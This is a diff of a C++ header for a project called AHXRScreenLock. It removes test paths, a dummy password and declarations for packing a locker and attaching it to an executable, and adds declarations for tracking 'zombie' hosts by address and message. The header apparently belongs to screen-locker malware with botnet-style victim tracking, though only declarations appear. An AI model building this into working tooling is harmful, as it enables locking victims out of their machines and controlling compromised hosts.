@@ -1,3 +1,4 @@
+//=======================================================
 /*
 	@title
 		AHXRScreenLock
@@ -20,16 +21,14 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#pragma once
 #include <string>
 
-#define DUMMY_FILE "C:\\Users\\-\\Documents\\Visual Studio 2015\\Projects\\AHXR ScreenLock\\Debug\\Dummy.exe"
-#define DUMMY_STUDIO_THIS_EXE "C:\\Users\\-\\Documents\\Visual Studio 2015\\Projects\\AHXR ScreenLock\\Debug\\AHXRLocker.exe" 
-#define DUMMY_EXE "C:\\Users\\-\\Documents\\Visual Studio 2015\\Projects\\AHXR ScreenLock\\calc.exe"
-#define DUMMY_PASSWORD "hi"
-#define DUMMY_MESSAGE "Locked out :)"
-#define EMERGENCY_MODE
-
-extern void packLocker(std::string fileName, std::string password, std::string message);
-extern void packLocker(std::string fileName, std::string password, std::string message, std::string address);
-extern void attachExecutable(std::string packedFile, std::string exePath);
+extern int addZombie(std::string zombAddress, std::string zombieMessage);
+extern int getZombieCount();
+extern std::string getZombieAddress(int zombieID);
+extern std::string getZombieMessage(int zombieID);
+extern void setZombieListID(int zombieID, int idx);
+extern int getZombieIDFromAddress(std::string zombAddress);
+extern void deleteZombie(int zombieID);
+extern int getZombieIDFromMessage(std::string zombMessage);
+extern int getZombieIDFromIDX(int idx);
